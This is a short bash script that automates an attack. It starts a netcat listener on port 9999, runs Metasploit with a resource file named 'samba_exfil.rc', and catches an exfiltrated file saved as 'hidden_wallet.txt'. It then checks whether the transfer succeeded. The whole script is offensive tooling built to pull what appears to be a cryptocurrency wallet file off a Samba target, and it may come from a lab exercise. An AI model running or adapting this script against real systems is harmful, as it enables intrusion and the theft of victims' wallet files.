#!/bin/bash

RC_SCRIPT="samba_exfil.rc"
SAVE_TO="/home/dcloud/coinbank"
LISTEN_PORT=9999
SAVE_AS="$SAVE_TO/hidden_wallet.txt"

mkdir -p "$SAVE_TO"

echo "[*] Starting netcat listener on port $LISTEN_PORT..."
# Start listener in background; -v for verbose, -p for port, -w 30 for 30s timeout
nc -lvp "$LISTEN_PORT" -w 30 > "$SAVE_AS" &

NC_PID=$!

sleep 5   # small delay to let listener start

echo "[*] Running Metasploit exploit..."
msfconsole -q -r "$RC_SCRIPT" &

MSF_PID=$!

# Wait for netcat to finish or timeout
wait $NC_PID

# Optionally kill msfconsole if still running after nc finishes
if kill -0 $MSF_PID 2>/dev/null; then
    echo "[*] Killing Metasploit console after file transfer..."
    kill $MSF_PID
fi

if [[ -s "$SAVE_AS" ]]; then
    echo "[+] File received successfully: $SAVE_AS"
else
    echo "[!] File transfer failed or file is empty."
fi
